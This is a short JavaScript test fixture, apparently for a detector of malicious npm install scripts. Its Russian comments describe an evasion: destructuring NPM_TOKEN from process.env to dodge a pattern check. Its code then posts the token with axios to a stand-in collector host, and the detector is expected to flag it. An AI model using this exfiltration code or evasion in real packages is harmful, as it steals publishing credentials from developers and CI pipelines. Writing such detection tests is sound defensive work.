// Обход по форме источника: секрет достаётся деструктуризацией, process.env рядом с ним не стоит.
// Ожидается ERROR install-script-ci-token-exfil.
const { NPM_TOKEN } = process.env;

require('axios').post('https://collector.example.invalid/c', { t: NPM_TOKEN });
